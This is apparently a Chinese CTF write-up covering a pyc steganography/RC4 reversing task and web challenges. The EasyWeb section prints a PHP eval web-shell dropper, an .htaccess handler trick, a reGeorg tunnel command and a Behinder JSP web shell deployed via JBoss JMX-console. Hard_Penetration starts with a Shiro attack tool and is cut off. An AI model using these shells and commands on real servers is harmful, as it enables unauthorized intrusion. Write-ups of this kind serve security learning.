68 61 73 68 6c 69 62 72 03 00 00 00 72 0f 00 00 00 72 12 00 00 00 72 13 00 00 00 72 1d 00 00 00 da 08 5f 5f 6e 61 6d 65 5f 5f da 01 77 da 01 65 da 01 62 da 01 73 da 01 74 da 01 6d 72 36 00 00 00 72 06 00 00 00 72 1b 00 00 00 da 06 73 6f 72 74 65 64 da 05 69 74 65 6d 73 72 16 00 00 00 da 05 70 72 69 6e 74 da 06 64 65 63 6f 64 65 da 05 73 74 64 69 6e da 06 62 75 66 66 65 72 da 04 72 65 61 64 72 1c 00 00 00 da 01 63 da 06 64 69 67 65 73 74 72 0d 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 08 3c 6d 6f 64 75 6c 65 3e 01 00 00 00 73 32 00 00 00 00 02 08 01 0c 02 08 0a 08 0a 08 04 08 03 08 01 04 01 04 03 04 01 04 02 04 01 0e 01 0e 01 12 01 12 02 1e 01 12 01 0c 01 0a 02 0a 01 10 01 16 02 10 e9 </span><br></pre></td></tr></table></figure>

<p>将其转为十六进制后存储为文件可得一个 Python 3.10 的 pyc 文件。使用 stegosaurus 解隐写可以得到如下内容。此时需要修改  stegosaurus 工具的源码，将 <code>payload = str(payloadBytes, &quot;utf8&quot;)</code> 修改作 <code>payload = payloadBytes</code> 才能得到无法解码的字节载荷。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Extracted payload: bytearray(b&#39;\xe5\n2\xd6&quot;\xf0&#125;I\xb0\xcd\xa2\x11\xf0\xb4U\x166\xc5o\xdb\xc9\xead\x04\x15b&#39;)</span><br></pre></td></tr></table></figure>

<p>写脚本可以将 pyc 转换成字节码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;extracted.pyc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.seek(<span class="number">16</span>)</span><br><span class="line">  dis.dis(marshal.load(f))</span><br></pre></td></tr></table></figure>

<p>将字节码手动转译成 Python 代码并将解隐写得到的内容添加进去，可以得到如下脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KSA</span>(<span class="params">key</span>):</span></span><br><span class="line">    keylength = <span class="built_in">len</span>(key)</span><br><span class="line">    S=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j=((j + S[i]) + key[i % keylength]) % <span class="number">256</span></span><br><span class="line">        S[j],S[i]=S[i],S[j]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PRGA</span>(<span class="params">S</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[j],S[i]=S[i],S[j]</span><br><span class="line">        K=S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RC4</span>(<span class="params">key</span>):</span></span><br><span class="line">    S=KSA(key)</span><br><span class="line">    <span class="keyword">return</span> PRGA(S)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">p,stream</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:(x ^ stream.__next__()), p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    w=<span class="string">b&#x27;\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f&#x27;</span></span><br><span class="line">    e=<span class="string">b&#x27;$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~&#x27;</span></span><br><span class="line">    b=<span class="string">b&#x27;geo&#x27;</span></span><br><span class="line">    s=<span class="string">b&#x27;&#125;\xce`\xbej\xa2\x120\xb5\x8a\x94\x14&#123;\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141&#x27;</span></span><br><span class="line">    t=<span class="string">b&quot;Q_\xe2\xf8\x8c\x11M&#125;&#x27;&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1&quot;</span></span><br><span class="line">    m=&#123;<span class="number">2</span>:<span class="number">115</span> ,<span class="number">8</span>:<span class="number">97</span>, <span class="number">11</span>:<span class="number">117</span>, <span class="number">10</span>:<span class="number">114</span>&#125;</span><br><span class="line">    n=&#123;<span class="number">3</span>:<span class="number">119</span>, <span class="number">7</span>:<span class="number">116</span>, <span class="number">9</span>:<span class="number">124</span>, <span class="number">12</span>:<span class="number">127</span>&#125;</span><br><span class="line">    m|=&#123;x:x^n[x]<span class="keyword">for</span> x <span class="keyword">in</span> n&#125;  </span><br><span class="line">    m|=((i.bit_count(),i) <span class="keyword">for</span> i <span class="keyword">in</span> b)</span><br><span class="line">    stream=RC4(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x[<span class="number">1</span>],<span class="built_in">sorted</span>(m.items())))) </span><br><span class="line">    <span class="built_in">print</span> (stream)</span><br><span class="line">    <span class="built_in">print</span>(xor(w,stream).decode())</span><br><span class="line">    <span class="comment">#p=sys.stdin.buffer.read()</span></span><br><span class="line">    p=<span class="string">b&#x27;\xe5\n2\xd6&quot;\xf0&#125;I\xb0\xcd\xa2\x11\xf0\xb4U\x166\xc5o\xdb\xc9\xead\x04\x15b&#x27;</span></span><br><span class="line">    e=xor(e,stream)</span><br><span class="line">    c=xor(p,stream)</span><br><span class="line">    <span class="built_in">print</span> (c)</span><br><span class="line">    <span class="keyword">if</span> sha256(c).digest() == s:</span><br><span class="line">        <span class="built_in">print</span>(xor(t,stream).decode())</span><br><span class="line">    <span class="built_in">print</span>(e.decode())</span><br></pre></td></tr></table></figure>

<p>运行脚本可得如下信息。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;generator object PRGA at 0x000001D8EACA83C0&gt;</span><br><span class="line">Give me the mystery string :</span><br><span class="line">b&#39;flag&#123;P0w5rFu1_0pEn_50urcE&#125;&#39;</span><br><span class="line">Congratulations! Now you should now what the flag is</span><br><span class="line">You are wrong!</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;P0w5rFu1_0pEn_50urcE&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h3><p>在页面源码中可见如下提示。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /hint --&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 <code>/hint</code> 路由可得如下提示。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;hint&quot;</span>:<span class="string">&quot;# hint ^_^\n\tSo~ How to get files in this server? \n\tfiles/????????????????????????????????&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>访问 <code>/files</code> 路由，下载文件可得如下提示。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Try to scan 35000-40000 ^_^.</span><br><span class="line">All tables are empty except for the table where the username and password are located</span><br><span class="line">Table: employee</span><br></pre></td></tr></table></figure>

<p>使用 nmap 进行端口扫描，可以得到如下端口开放信息。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host is up (0.094s latency).</span><br><span class="line">Not shown: 5000 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">36842&#x2F;tcp open  unknown</span><br></pre></td></tr></table></figure>

<p>访问 36842 端口可得一个登录界面，稍微尝试可得 SQL 注入点。根据提示爆出账号 <code>admin</code>，密码 <code>99f609527226e076d668668582ac4420</code>。</p>
<p>扫描可得 <code>/file</code> 路由，存在一个文件上传点，尝试上传一个 <code>.htaccess</code> 将 txt 文件</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addhandler php5-script .txt</span><br></pre></td></tr></table></figure>

<p>将其上传后再尝试上传 PHP 文件。存在危险字符检测，因此采用触发写入，将内容完全 URL Encode，构造上传载荷如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">&quot;this.txt&quot;</span>,urldecode(<span class="string">&quot;%3c%3f%70%68%70%20%65%76%61%6c%28%22%24%5f%50%4f%53%54%5b%31%5d%22%29%3b&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>将其上传后访问 <code>/upload/1d929bafc144014d7e7df7fe817232e4/info.txt</code> 即可得到一个 shell。使用蚁剑连接，发现没有权限读取 flag。使用插件扫描内网端口可得 8006 端口是开放的。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623577753006/013752c36527cc823be3a7265965b1f1a80580b8.png" alt="image-20210613174909763"></p>
<p>上传 reGeorg 的 <code>tunnel.nosocket.php</code> 将内网端口代理出来。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -l 0.0.0.0 -p 3333 -u http:&#x2F;&#x2F;121.42.242.238:36842&#x2F;upload&#x2F;382f1b9e4a7b75dbeb05a3c4ed2fab04&#x2F;tunnel.nosocket.php -k a</span><br></pre></td></tr></table></figure>

<p>访问 localhost:8006 可以发现存在 Jboss，采用 JMX-Console 未授权访问进行攻击。使用冰蝎的 jsp 一句话生成新的 war 包。</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf zfsn.war shell.jsp</span><br></pre></td></tr></table></figure>

<p>将得到的包上传到可访问的路径下获取网址，使用 jboss.deployment 的 addUrl 将 war 包加载进去。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623592411437/37dc593e6dac7b21d484e82a8ed9634f2aa68485.png" alt="image-20210613215325841"></p>
<p> 使用冰蝎连接如下链接，即可在文件管理中读取到 flag。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8006&#x2F;zfsn&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>

<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623579630730/dbc0f7bd1357dc91baddc621cc7de517a2fe9b7b.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Hard-Penetration"><a href="#Hard-Penetration" class="headerlink" title="Hard_Penetration"></a>Hard_Penetration</h3><p>使用 shiro_attack 2.0 对 <code>/login</code> 路由进行攻击。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9